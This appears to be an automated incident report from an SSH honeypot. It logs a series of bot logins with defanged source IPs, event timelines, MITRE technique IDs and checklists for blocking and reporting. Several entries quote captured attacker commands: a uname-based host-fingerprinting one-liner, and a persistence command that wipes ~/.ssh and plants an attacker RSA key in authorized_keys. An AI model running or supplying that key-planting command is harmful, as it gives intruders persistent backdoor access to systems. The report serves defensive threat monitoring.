**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:51:17` | `cowrie.session.connect` |
| `2026-07-05 11:51:17` | `cowrie.client.version` |
| `2026-07-05 11:51:17` | `cowrie.client.kex` |
| `2026-07-05 11:51:17` | `cowrie.login.success` |
| `2026-07-05 11:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.204.230[.]91` to AbuseIPDB if not already reported
- [ ] Block `189.204.230[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-260daf1862b0

| Field | Detail |
|---|---|
| **Source IP** | `189.204.230[.]91` |
| **First Seen** | 2026-07-05 11:51 |
| **Last Seen** | 2026-07-05 11:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:51:18` | `cowrie.session.connect` |
| `2026-07-05 11:51:18` | `cowrie.client.version` |
| `2026-07-05 11:51:18` | `cowrie.client.kex` |
| `2026-07-05 11:51:18` | `cowrie.login.success` |
| `2026-07-05 11:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.204.230[.]91` to AbuseIPDB if not already reported
- [ ] Block `189.204.230[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73e24d345c04

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:51 |
| **Last Seen** | 2026-07-05 11:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:51:28` | `cowrie.session.connect` |
| `2026-07-05 11:51:29` | `cowrie.client.version` |
| `2026-07-05 11:51:29` | `cowrie.client.kex` |
| `2026-07-05 11:51:31` | `cowrie.login.success` |
| `2026-07-05 11:51:33` | `cowrie.session.params` |
| `2026-07-05 11:51:33` | `cowrie.command.input` |
| `2026-07-05 11:51:33` | `cowrie.command.input` |
| `2026-07-05 11:51:33` | `cowrie.command.input` |
| `2026-07-05 11:51:33` | `cowrie.command.input` |
| `2026-07-05 11:51:33` | `cowrie.command.input` |
| `2026-07-05 11:51:33` | `cowrie.command.success` |
| `2026-07-05 11:51:33` | `cowrie.command.input` |
| `2026-07-05 11:51:33` | `cowrie.command.input` |
| `2026-07-05 11:51:33` | `cowrie.command.input` |
| `2026-07-05 11:51:33` | `cowrie.command.input` |
| `2026-07-05 11:51:34` | `cowrie.log.closed` |
| `2026-07-05 11:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-018888373e2e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:52 |
| **Last Seen** | 2026-07-05 11:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:52:52` | `cowrie.session.connect` |
| `2026-07-05 11:52:52` | `cowrie.client.version` |
| `2026-07-05 11:52:52` | `cowrie.client.kex` |
| `2026-07-05 11:52:55` | `cowrie.login.success` |
| `2026-07-05 11:52:57` | `cowrie.session.params` |
| `2026-07-05 11:52:57` | `cowrie.command.input` |
| `2026-07-05 11:52:57` | `cowrie.command.input` |
| `2026-07-05 11:52:57` | `cowrie.command.input` |
| `2026-07-05 11:52:57` | `cowrie.command.input` |
| `2026-07-05 11:52:57` | `cowrie.command.input` |
| `2026-07-05 11:52:57` | `cowrie.command.success` |
| `2026-07-05 11:52:57` | `cowrie.command.input` |
| `2026-07-05 11:52:57` | `cowrie.command.input` |
| `2026-07-05 11:52:57` | `cowrie.command.input` |
| `2026-07-05 11:52:57` | `cowrie.command.input` |
| `2026-07-05 11:52:58` | `cowrie.log.closed` |
| `2026-07-05 11:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-787c1451233d

| Field | Detail |
|---|---|
| **Source IP** | `47.80.29[.]108` |
| **First Seen** | 2026-07-05 11:54 |
| **Last Seen** | 2026-07-05 11:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:54:03` | `cowrie.session.connect` |
| `2026-07-05 11:54:03` | `cowrie.client.version` |
| `2026-07-05 11:54:03` | `cowrie.client.kex` |
| `2026-07-05 11:54:03` | `cowrie.login.success` |
| `2026-07-05 11:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.29[.]108` to AbuseIPDB if not already reported
- [ ] Block `47.80.29[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95bf98a8367b

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-05 11:54 |
| **Last Seen** | 2026-07-05 11:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:54:04` | `cowrie.session.connect` |
| `2026-07-05 11:54:04` | `cowrie.client.version` |
| `2026-07-05 11:54:04` | `cowrie.client.kex` |
| `2026-07-05 11:54:04` | `cowrie.login.success` |
| `2026-07-05 11:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a098a04d7b06

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:54 |
| **Last Seen** | 2026-07-05 11:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:54:15` | `cowrie.session.connect` |
| `2026-07-05 11:54:16` | `cowrie.client.version` |
| `2026-07-05 11:54:16` | `cowrie.client.kex` |
| `2026-07-05 11:54:19` | `cowrie.login.success` |
| `2026-07-05 11:54:21` | `cowrie.session.params` |
| `2026-07-05 11:54:21` | `cowrie.command.input` |
| `2026-07-05 11:54:21` | `cowrie.command.input` |
| `2026-07-05 11:54:21` | `cowrie.command.input` |
| `2026-07-05 11:54:21` | `cowrie.command.input` |
| `2026-07-05 11:54:21` | `cowrie.command.input` |
| `2026-07-05 11:54:21` | `cowrie.command.success` |
| `2026-07-05 11:54:21` | `cowrie.command.input` |
| `2026-07-05 11:54:21` | `cowrie.command.input` |
| `2026-07-05 11:54:21` | `cowrie.command.input` |
| `2026-07-05 11:54:21` | `cowrie.command.input` |
| `2026-07-05 11:54:22` | `cowrie.log.closed` |
| `2026-07-05 11:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-329b58ebbbf8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 11:55 |
| **Last Seen** | 2026-07-05 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:55:11` | `cowrie.session.connect` |
| `2026-07-05 11:55:11` | `cowrie.client.version` |
| `2026-07-05 11:55:11` | `cowrie.client.kex` |
| `2026-07-05 11:55:11` | `cowrie.login.success` |
| `2026-07-05 11:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d40df25e0590

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 11:55 |
| **Last Seen** | 2026-07-05 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:55:12` | `cowrie.session.connect` |
| `2026-07-05 11:55:12` | `cowrie.client.version` |
| `2026-07-05 11:55:12` | `cowrie.client.kex` |
| `2026-07-05 11:55:12` | `cowrie.login.success` |
| `2026-07-05 11:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f1ed16beaaf

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 11:55 |
| **Last Seen** | 2026-07-05 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:55:13` | `cowrie.session.connect` |
| `2026-07-05 11:55:13` | `cowrie.client.version` |
| `2026-07-05 11:55:13` | `cowrie.client.kex` |
| `2026-07-05 11:55:13` | `cowrie.login.success` |
| `2026-07-05 11:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fc5dd507dda

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 11:55 |
| **Last Seen** | 2026-07-05 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:55:13` | `cowrie.session.connect` |
| `2026-07-05 11:55:13` | `cowrie.client.version` |
| `2026-07-05 11:55:13` | `cowrie.client.kex` |
| `2026-07-05 11:55:13` | `cowrie.login.success` |
| `2026-07-05 11:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51308ff0f835

| Field | Detail |
|---|---|
| **Source IP** | `181.0.214[.]136` |
| **First Seen** | 2026-07-05 11:57 |
| **Last Seen** | 2026-07-05 11:57 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:57:25` | `cowrie.session.connect` |
| `2026-07-05 11:57:25` | `cowrie.client.version` |
| `2026-07-05 11:57:25` | `cowrie.client.kex` |
| `2026-07-05 11:57:26` | `cowrie.login.success` |
| `2026-07-05 11:57:27` | `cowrie.session.params` |
| `2026-07-05 11:57:27` | `cowrie.command.input` |
| `2026-07-05 11:57:27` | `cowrie.command.failed` |
| `2026-07-05 11:57:27` | `cowrie.log.closed` |
| `2026-07-05 11:57:28` | `cowrie.session.params` |
| `2026-07-05 11:57:28` | `cowrie.command.input` |
| `2026-07-05 11:57:28` | `cowrie.session.file_download` |
| `2026-07-05 11:57:28` | `cowrie.log.closed` |
| `2026-07-05 11:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.0.214[.]136` to AbuseIPDB if not already reported
- [ ] Block `181.0.214[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0e6b5dfa566

| Field | Detail |
|---|---|
| **Source IP** | `181.0.214[.]136` |
| **First Seen** | 2026-07-05 11:57 |
| **Last Seen** | 2026-07-05 11:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:57:37` | `cowrie.session.connect` |
| `2026-07-05 11:57:37` | `cowrie.client.version` |
| `2026-07-05 11:57:37` | `cowrie.client.kex` |
| `2026-07-05 11:57:38` | `cowrie.login.success` |
| `2026-07-05 11:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.0.214[.]136` to AbuseIPDB if not already reported
- [ ] Block `181.0.214[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2198697214b2

| Field | Detail |
|---|---|
| **Source IP** | `181.0.214[.]136` |
| **First Seen** | 2026-07-05 11:57 |
| **Last Seen** | 2026-07-05 11:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:57:41` | `cowrie.session.connect` |
| `2026-07-05 11:57:41` | `cowrie.client.version` |
| `2026-07-05 11:57:41` | `cowrie.client.kex` |
| `2026-07-05 11:57:42` | `cowrie.login.success` |
| `2026-07-05 11:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.0.214[.]136` to AbuseIPDB if not already reported
- [ ] Block `181.0.214[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0478b4d9127

| Field | Detail |
|---|---|
| **Source IP** | `175.119.225[.]68` |
| **First Seen** | 2026-07-05 11:58 |
| **Last Seen** | 2026-07-05 11:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:58:53` | `cowrie.session.connect` |
| `2026-07-05 11:58:53` | `cowrie.client.version` |
| `2026-07-05 11:58:53` | `cowrie.client.kex` |
| `2026-07-05 11:58:54` | `cowrie.login.success` |
| `2026-07-05 11:58:55` | `cowrie.session.params` |
| `2026-07-05 11:58:55` | `cowrie.command.input` |
| `2026-07-05 11:58:55` | `cowrie.command.failed` |
| `2026-07-05 11:58:55` | `cowrie.log.closed` |
| `2026-07-05 11:58:56` | `cowrie.session.params` |
| `2026-07-05 11:58:56` | `cowrie.command.input` |
| `2026-07-05 11:58:56` | `cowrie.session.file_download` |
| `2026-07-05 11:58:56` | `cowrie.log.closed` |
| `2026-07-05 11:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.119.225[.]68` to AbuseIPDB if not already reported
- [ ] Block `175.119.225[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50363cace2d

| Field | Detail |
|---|---|
| **Source IP** | `175.119.225[.]68` |
| **First Seen** | 2026-07-05 11:58 |
| **Last Seen** | 2026-07-05 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:58:56` | `cowrie.session.connect` |
| `2026-07-05 11:58:56` | `cowrie.client.version` |
| `2026-07-05 11:58:56` | `cowrie.client.kex` |
| `2026-07-05 11:58:57` | `cowrie.login.success` |
| `2026-07-05 11:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.119.225[.]68` to AbuseIPDB if not already reported
- [ ] Block `175.119.225[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d977f762695

| Field | Detail |
|---|---|
| **Source IP** | `175.119.225[.]68` |
| **First Seen** | 2026-07-05 11:58 |
| **Last Seen** | 2026-07-05 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:58:57` | `cowrie.session.connect` |
| `2026-07-05 11:58:57` | `cowrie.client.version` |
| `2026-07-05 11:58:58` | `cowrie.client.kex` |
| `2026-07-05 11:58:58` | `cowrie.login.success` |
| `2026-07-05 11:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.119.225[.]68` to AbuseIPDB if not already reported
- [ ] Block `175.119.225[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34270eb01af5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 11:59 |
| **Last Seen** | 2026-07-05 12:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:59:56` | `cowrie.session.connect` |
| `2026-07-05 11:59:57` | `cowrie.client.version` |
| `2026-07-05 11:59:57` | `cowrie.client.kex` |
| `2026-07-05 12:00:03` | `cowrie.login.success` |
| `2026-07-05 12:00:06` | `cowrie.session.params` |
| `2026-07-05 12:00:06` | `cowrie.command.input` |
| `2026-07-05 12:00:07` | `cowrie.log.closed` |
| `2026-07-05 12:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-766a45d9a31e

| Field | Detail |
|---|---|
| **Source IP** | `175.103.54[.]172` |
| **First Seen** | 2026-07-05 12:02 |
| **Last Seen** | 2026-07-05 12:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:02:29` | `cowrie.session.connect` |
| `2026-07-05 12:02:29` | `cowrie.client.version` |
| `2026-07-05 12:02:30` | `cowrie.client.kex` |
| `2026-07-05 12:02:31` | `cowrie.login.success` |
| `2026-07-05 12:02:32` | `cowrie.session.params` |
| `2026-07-05 12:02:32` | `cowrie.command.input` |
| `2026-07-05 12:02:32` | `cowrie.command.failed` |
| `2026-07-05 12:02:32` | `cowrie.log.closed` |
| `2026-07-05 12:02:33` | `cowrie.session.params` |
| `2026-07-05 12:02:33` | `cowrie.command.input` |
| `2026-07-05 12:02:33` | `cowrie.session.file_download` |
| `2026-07-05 12:02:33` | `cowrie.log.closed` |
| `2026-07-05 12:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.103.54[.]172` to AbuseIPDB if not already reported
- [ ] Block `175.103.54[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b84cc70da371

| Field | Detail |
|---|---|
| **Source IP** | `175.103.54[.]172` |
| **First Seen** | 2026-07-05 12:02 |
| **Last Seen** | 2026-07-05 12:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:02:33` | `cowrie.session.connect` |
| `2026-07-05 12:02:33` | `cowrie.client.version` |
| `2026-07-05 12:02:34` | `cowrie.client.kex` |
| `2026-07-05 12:02:35` | `cowrie.login.success` |
| `2026-07-05 12:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.103.54[.]172` to AbuseIPDB if not already reported
- [ ] Block `175.103.54[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a7fbed86646

| Field | Detail |
|---|---|
| **Source IP** | `175.103.54[.]172` |
| **First Seen** | 2026-07-05 12:02 |
| **Last Seen** | 2026-07-05 12:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:02:35` | `cowrie.session.connect` |
| `2026-07-05 12:02:35` | `cowrie.client.version` |
| `2026-07-05 12:02:36` | `cowrie.client.kex` |
| `2026-07-05 12:02:37` | `cowrie.login.success` |
| `2026-07-05 12:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.103.54[.]172` to AbuseIPDB if not already reported
- [ ] Block `175.103.54[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8a44a74c35

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-07-05 12:04 |
| **Last Seen** | 2026-07-05 12:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
